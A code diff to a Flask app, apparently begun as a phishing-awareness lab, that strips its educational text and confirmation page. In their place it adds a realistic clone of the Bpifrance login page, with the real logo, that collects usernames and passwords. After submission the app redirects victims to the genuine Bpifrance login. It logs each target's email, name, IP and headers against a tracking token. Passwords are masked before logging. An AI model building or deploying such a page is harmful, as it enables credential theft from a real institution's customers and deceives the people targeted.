@@ -1,18 +1,11 @@
 #!/usr/bin/env python3
-"""
-safetest_landing.py
-Small Flask app to serve a safe landing page for the lab exercise and log clicks.
-- Logs: token, timestamp, client_ip, user_agent to clicks.csv
-- Shows clear educational message and link to training material
-Run with: python3 safetest_landing.py
-"""
 
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect
 from datetime import datetime
 import csv
 from pathlib import Path
 import json
-from datetime import datetime
+from datetime import datetime, timezone
 from pathlib import Path
 from flask import request, render_template_string, jsonify
 from flask import send_from_directory, abort
@@ -32,21 +25,169 @@ LANDING_HTML = """
 <head><meta charset="utf-8"><title>Offre exclusive</title></head>
 <body>
 
-  <form method="post" action="/submit" style="display:block;">
-      <!-- token envoyé en hidden (présent dans le lien) -->
-      <input type="hidden" name="token" value="{{ token }}"/>
 
-      <label for="username">Nom d'utilisateur (simulation)</label><br/>
-      <input id="username" name="username" type="text" placeholder="" style="width:100%;padding:8px;margin-bottom:10px;"/>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
+	<title>Connexion - Bpifrance</title>
+	<style type="text/css">/* Basique, classique, pas de fonts externes ni librairies */
+    :root {
+      --bg: #ffffff;
+      --text: #222;
+      --muted: #666;
+      --accent: #f6c400;
+      --input-border: #ccc;
+      --card-width: 480px;
+    }
 
-      <label for="client_number">Numéro client (simulation)</label><br/>
-      <input id="client_number" name="client_number" type="text" placeholder="" style="width:100%;padding:8px;margin-bottom:14px;"/>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+    }
 
-      <button type="submit" style="background:#ff6b6b;color:#fff;padding:10px 18px;border:none;border-radius:6px;font-weight:700;">
-        Valider
-      </button>
-      <p>Token de test : <code>{{ token }}</code></p>
-  </form>
+    /* Centrer l'ensemble verticalement et horizontalement */
+    .page {
+      min-height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* Carte blanche contenant logo + formulaire */
+    .card {
+      width: 100%;
+      max-width: var(--card-width);
+      background: #fff;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.06);
+      border-radius: 6px;
+      padding: 28px;
+      box-sizing: border-box;
+    }
+
+    /* Logo centré au milieu */
+    .brand {
+      display: flex;
+      align-items: center;
+      justify-content: center;   /* CENTRER horizontalement */
+      margin-bottom: 18px;
+    }
+    .brand img {
+      display:block;
+      max-width: 220px;
+      height: auto;
+    }
+
+    h1 {
+      font-size: 18px;
+      margin: 0 0 14px 0;
+      color: var(--muted);
+      text-align: left;
+    }
+
+    form { width: 100%; }
+
+    label {
+      display:block;
+      font-weight: 600;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
+    .row {
+      margin-bottom: 12px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      box-sizing: border-box;
+      border: 1px solid var(--input-border);
+      border-radius: 4px;
+      font-size: 15px;
+      background: #fff;
+    }
+
+    .small-link {
+      float: right;
+      font-size: 13px;
+      color: #0b63d6;
+      text-decoration: none;
+    }
+    .small-link:hover { text-decoration: underline; }
+
+    .actions {
+      display:flex;
+      gap:12px;
+      align-items:center;
+      margin-top: 10px;
+    }
+
+    .btn {
+      padding: 10px 16px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      font-weight:700;
+      font-size:14px;
+    }
+
+    .btn-ghost {
+      background:#efefef;
+      color: #111;
+    }
+
+    .btn-primary {
+      background: var(--accent);
+      color: #111;
+    }
+
+    .footer {
+      margin-top: 16px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    /* Responsive simple */
+    @media (max-width: 520px) {
+      .card { padding: 18px; }
+      .brand img { max-width: 180px; }
+    }
+	</style>
+</head>
+<body>
+<div class="page">
+<div class="card">
+<div class="brand"><img alt="Bpifrance" src="https://storageprdv2inwink.blob.core.windows.net/cu-4fca10a0-d711-4c30-a65b-b2ccd4560137-public/84b6c04b-dd07-4bc2-956f-b40d8000bf22/assets/pictures/logo-bpifrance-SS_Reserve.png" /></div>
+
+<h1>Connectez-vous &agrave; votre compte Bpifrance</h1>
+
+<!--form action="" autocomplete="off" method="POST"-->
+
+<form method="post" action="/submit"  autocomplete="off">
+
+    <input type="hidden" name="token" value="{{ token }}"/>
+
+    <div class="row"><label for="login">Identifiant (email ou nom d&#39;utilisateur) <a class="small-link" href="#" title="Mot de passe oublié">Mot de passe oubli&eacute; ?</a> </label> <input id="login" name="login" placeholder="Email ou nom d'utilisateur" required="" type="text" /></div>
+
+    <div class="row"><label for="password">Mot de passe</label> <input id="password" name="password" placeholder="Mot de passe" required="" type="password" /></div>
+
+    <div class="row" style="display:flex;align-items:center;gap:8px;"><input id="remember" name="remember" type="checkbox" /> <label for="remember" style="margin:0; font-weight:600;">Se souvenir de moi</label></div>
+
+    <div class="actions"><!-- Pas de JS : les boutons n'ont pas d'action spéciale ici --><button class="btn btn-ghost" type="button">RETOUR</button><button class="btn btn-primary" type="submit">ME CONNECTER</button></div>
+
+    <p class="footer">Ce site est h&eacute;berg&eacute; par inwink  pour le compte de Bpifrance. <a href="#" style="color:#0b63d6;text-decoration:none;">En savoir plus...</a></p>
+
+    <p>Token de test : <code>{{ token }}</code></p>
+
+</form>
+</div>
+</div>
 </body>
 </html>
 """
@@ -81,7 +222,7 @@ def lookup_token_info_from_map(token, token_map_file=TOKEN_MAP_FILE):
         for r in reader:
             tok = (r.get("token") or "").strip()
             if tok and tok == token:
-                return {"email": (r.get("email") or "-").strip(), "name": (r.get("name") or "-").strip()}
+                return {"Email": (r.get("Email") or "-").strip(), "FirstName": (r.get("FirstName") or "-").strip()}
     return None
 
 def append_submission_record(rec: dict):
@@ -95,12 +236,6 @@ def append_submission_record(rec: dict):
         if not exists:
             writer.writerow(header)
         writer.writerow([rec.get(h, "-") for h in header])
-
-
-#@app.route("/attachments/<path:filename>")
-#def serve_attachment(filename):
-#    # Sécurisé : n'autorise que les fichiers existants dans le dossier attachments
-#    return send_from_directory(str(ATTACHMENTS_DIR), filename, as_attachment=False)
 
 
 @app.route("/attachments/<path:filename>")
@@ -117,7 +252,7 @@ def serve_attachment(filename):
 @app.route("/landing")
 def landing():
     token = request.args.get("token","-")
-    ts = datetime.utcnow().isoformat()+"Z"
+    ts = datetime.now(timezone.utc).isoformat()
     client_ip = request.remote_addr
     ua = request.headers.get("User-Agent","-")
     append_click([ts, token, client_ip, ua])
@@ -129,8 +264,8 @@ def landing():
 def submit_form():
     # récupère champs
     token = (request.form.get("token") or "").strip()
-    username = request.form.get("username", "").strip()
-    client_number = request.form.get("client_number", "").strip()
+    username = request.form.get("login", "").strip()
+    password = request.form.get("password", "").strip()
 
     client_ip = request.remote_addr or "-"
     ua = request.headers.get("User-Agent", "-")
@@ -138,28 +273,28 @@ def submit_form():
     full_url = request.url
 
     # lookup token -> email,name (si disponible)
-    info = lookup_token_info_from_map(token) or {"email": "-", "name": "-"}
+    info = lookup_token_info_from_map(token) or {"Email": "-", "FirstName": "-"}
 
     # masquage : on ne stocke pas la valeur en clair
     uname_masked = mask_value(username)
     uname_len = len(username)
-    cnum_masked = mask_value(client_number)
-    cnum_len = len(client_number)
+    password_masked = mask_value(password)
+    password_len = len(password)
 
     # headers (sérialisés) pour debug (optionnel)
     headers_json = json.dumps({k: v for k, v in request.headers.items()}, ensure_ascii=False)
 
     rec = {
-        "timestamp": datetime.utcnow().isoformat() + "Z",
+        "timestamp": datetime.now(timezone.utc).isoformat(),
         "token": token or "-",
-        "email": info["email"],
-        "name": info["name"],
+        "email": info["Email"],
+        "name": info["FirstName"],
         "client_ip": client_ip,
         "user_agent": ua,
-        "username_masked": username,
-        "username_length": client_number,
-        "client_number_masked": cnum_masked,
-        "client_number_length": cnum_len,
+        "username_masked": uname_masked,
+        "username_length": uname_len,
+        "client_number_masked": password_masked,
+        "client_number_length": password_len,
         "referrer": ref,
         "full_url": full_url,
         "headers_json": headers_json
@@ -167,20 +302,8 @@ def submit_form():
 
     append_submission_record(rec)
 
-    # réponse pédagogique (page confirm)
-    confirm_html = """
-    <!doctype html>
-    <html><head><meta charset="utf-8"><title>Confirmation</title></head><body style="font-family:Arial,sans-serif;padding:18px;">
-      <div style="max-width:700px;margin:0 auto;background:#fff;padding:16px;border:1px solid #eee;border-radius:8px;">
-        <h2 style="color:#0b6;">Merci</h2>
-        <p>Ta soumission a été enregistrée.</p>
-        <p>Token : <code>{token}</code></p>
-        <p><a href="/landing?token={token}"></a></p>
-      </div>
-    </body></html>
-    """.format(token=token or "-")
-
-    return confirm_html, 200, {"Content-Type": "text/html; charset=utf-8"}
+    # Redirection vers la vraie page de connexion Bpifrance
+    return redirect("https://moncompte.bpifrance.fr/login", code=302)
 
 
 if __name__ == "__main__":
